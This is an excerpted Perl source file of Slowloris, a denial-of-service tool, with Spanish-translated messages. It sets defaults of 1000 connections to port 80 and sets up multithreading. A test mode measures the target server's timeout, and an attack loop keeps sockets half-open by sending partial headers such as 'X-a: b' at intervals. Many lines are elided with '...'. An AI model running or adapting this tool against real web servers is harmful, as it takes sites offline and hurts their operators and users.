...
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
  ...
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
 Bienvenido a Slowloris - El bajo ancho de banda, pero codicioso y venenoso cliente HTTP
EOTEXT
...
unless ($host) {
    ...
    print "\n\tEscriba 'perldoc $ 0' para obtener ayuda con las opciones.\n\n";
    exit;
}

unless ($port) {
    $port = 80;
    print "Por defecto al puerto 80.\n";
}

unless ($tcpto) {
    $tcpto = 10;
    print "Por defecto a un tiempo de espera de conexión tcp de 10 segundos.\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 100;
        print "Por defecto a un tiempo de espera de reintento de 100 segundos.s\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Por defecto a 1000 conexiones.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Multithreading Activado\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No se han encontrado capacidades de multithreading!\n";
    print "Slowloris será más lento de lo normal como resultado.\n";
}
...
if ($test) {
    ...
    print "Esta prueba puede tomar hasta $totaltime minutos.\n";
    ...
    if ($working) {
        ...
        if ( print $sock $primarypayload ) {
            ...
            print
"Eso es extraño: me conecté pero no pude enviar los datos a $host:$port.\n";
            print "¿Pasa algo malo?\nMuriendo.\n";
            exit;
        }
    }
    else {
        print "Uhm ... no puedo conectarme a $host:$port.\n";
        print "¿Pasa algo malo?\nMuriendo.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Intentando a $times[$i] segundos de delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tTrabajado.\n";
            $delay = $times[$i];
            ...
            print "\tFallo despues de $times[$i] segundos.\n";
        }
    }

    if ( print $sock "Coneccion: Cerrada\r\n\r\n" ) {
        print "Vale, es tiempo suficiente. Slowloris cerró el zócalo.\n";
    ...
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Como el tiempo de espera terminó siendo tan pequeño ($delay de retraso) y generalmente
toma entre 200-500 subprocesos para la mayoría de los servidores y asumiendo cualquier latencia en
todos ... puede que tengas problemas para usar Slowloris contra este objetivo. Usted puede
ajustar el indicador de tiempo de espera a menos de 10 segundos, pero aún así puede que no
...
EOSUCKS2BU
    ...
    print
"Conectando a $host:$port por cada $timeout segundos con $connections sockets:\n";
...
sub doconnections {
    ...
    while (1) {
        ...
        print
"Estadísticas actuales:\tSlowloris ahora ha enviado $packetcount paquetes con éxito.\nEste hilo ahora duerme por $timeout segundos ...\n\n";
        sleep($timeout);
    }
}
